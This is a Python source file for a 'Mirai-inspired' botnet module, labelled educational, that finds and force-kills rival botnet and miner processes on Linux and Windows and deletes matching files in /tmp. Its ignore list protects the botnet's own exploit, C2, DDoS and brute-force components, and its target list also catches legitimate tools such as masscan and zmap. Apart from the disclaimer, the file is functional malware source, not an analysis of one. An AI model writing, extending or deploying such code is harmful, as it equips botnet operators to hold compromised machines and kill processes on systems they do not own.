#!/usr/bin/env python3
"""
Process Killer Module - Mirai-inspired Implementation
Educational/Research Purpose Only

This module implements functionality similar to Mirai's process killing capability
that targets competing malware/botnet processes.
"""

import os
import re
import subprocess
from typing import List, Optional
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('process_killer')

class ProcessKiller:
    def __init__(self):
        """Initialize the process killer module"""
        # Known competing malware process names
        self.target_processes = [
            # Common botnet process names
            'mips.', 'mipsel.', 'sh4.', 'x86_64.', 'armv6l.', 'i686.',
            'jackmybot', 'busyboxterrorist', 'unsiryak', 'watchbot',
            'aussiebots', 'gifbots', 'xmrminer', 'bashbots',
            # Common competitive botnet processes
            'muhstik', 'miori', 'satori', 'qbot', 'zollard', 'masuta',
            'ogre', 'hajime', 'lightaidra', 'gafgyt', 'tsunami', 'kowai',
            # Generic suspicious names
            'miraibrute', 'cnrig', 'xmrig', 'minerd', 'coinhive', 'bashirc',
            'sohorigs', 'ddg',
            # Scanning processes
            'masscan', 'zmap'
        ]
        
        # Mirai avoided targeting certain process names to prevent killing itself
        self.ignore_processes = [
            'exploit', 'c2_communication', 'ddos_manager', 'scanner',
            'telnet_scanner', 'bruteforcer', 'session_manager'
        ]

    def kill_competing_processes(self) -> int:
        """
        Identify and kill competing malware processes
        Similar to Mirai's killer functionality
        
        Returns:
            Number of killed processes
        """
        killed_count = 0
        
        try:
            if os.name == 'posix':  # Linux systems
                killed_count = self._kill_linux_processes()
            elif os.name == 'nt':  # Windows systems
                killed_count = self._kill_windows_processes()
            
            logger.info(f"Killed {killed_count} competing processes")
        except Exception as e:
            logger.error(f"Error killing competing processes: {e}")
        
        return killed_count

    def _kill_linux_processes(self) -> int:
        """
        Kill competing processes on Linux systems
        
        Returns:
            Number of killed processes
        """
        killed_count = 0
        
        try:
            # Get all processes
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            process_list = result.stdout.splitlines()
            
            for process in process_list:
                if any(target in process.lower() for target in self.target_processes):
                    if not any(safe in process.lower() for safe in self.ignore_processes):
                        # Extract PID (second column in ps aux output)
                        parts = process.split()
                        if len(parts) >= 2:
                            try:
                                pid = int(parts[1])
                                os.kill(pid, 9)  # SIGKILL
                                logger.info(f"Killed competing process: {process}")
                                killed_count += 1
                            except (ValueError, ProcessLookupError, PermissionError):
                                pass
        except Exception as e:
            logger.error(f"Error in Linux process killing: {e}")
        
        return killed_count

    def _kill_windows_processes(self) -> int:
        """
        Kill competing processes on Windows systems
        
        Returns:
            Number of killed processes
        """
        killed_count = 0
        
        try:
            # Get all processes using tasklist
            result = subprocess.run(['tasklist', '/fo', 'csv'], capture_output=True, text=True)
            process_list = result.stdout.splitlines()
            
            for process in process_list:
                if any(target in process.lower() for target in self.target_processes):
                    if not any(safe in process.lower() for safe in self.ignore_processes):
                        # Extract process name from CSV format
                        match = re.search(r'"([^"]+)"', process)
                        if match:
                            proc_name = match.group(1)
                            try:
                                subprocess.run(['taskkill', '/f', '/im', proc_name], 
                                              capture_output=True)
                                logger.info(f"Killed competing process: {proc_name}")
                                killed_count += 1
                            except subprocess.SubprocessError:
                                pass
        except Exception as e:
            logger.error(f"Error in Windows process killing: {e}")
        
        return killed_count

    def clean_system(self) -> bool:
        """
        Clean common malware directories and files
        
        Returns:
            Success status
        """
        if os.name != 'posix':
            return False
            
        common_malware_paths = [
            '/tmp/.*sh',
            '/tmp/.*miner',
            '/tmp/xm*',
            '/tmp/.*cnrig',
            '/tmp/.*ddgs',
            '/tmp/.*bashirc',
            '/tmp/.*masuta',
            '/tmp/.*tsunami'
        ]
        
        try:
            for path_pattern in common_malware_paths:
                try:
                    # Use find to identify files matching pattern
                    find_cmd = f"find /tmp -name '{path_pattern}' -type f"
                    result = subprocess.run(find_cmd, shell=True, capture_output=True, text=True)
                    
                    for file_path in result.stdout.splitlines():
                        if file_path.strip():
                            try:
                                os.remove(file_path)
                                logger.info(f"Removed competing malware file: {file_path}")
                            except (PermissionError, FileNotFoundError):
                                pass
                except Exception as e:
                    logger.error(f"Error cleaning path {path_pattern}: {e}")
            
            return True
        except Exception as e:
            logger.error(f"Error in system cleaning: {e}")
            return False


if __name__ == "__main__":
    # Demo mode when run directly
    killer = ProcessKiller()
    print("[*] Process Killer Module (Mirai-inspired)")
    print("[*] WARNING: For educational/research purposes only")
    print("[*] Running in demo mode - no processes will be killed")
    
    # Show processes that would be targeted
    print("\n[*] Target process patterns:")
    for proc in killer.target_processes:
        print(f"  - {proc}")
    
    print("\n[*] Ignored process patterns:")
    for proc in killer.ignore_processes:
        print(f"  - {proc}")
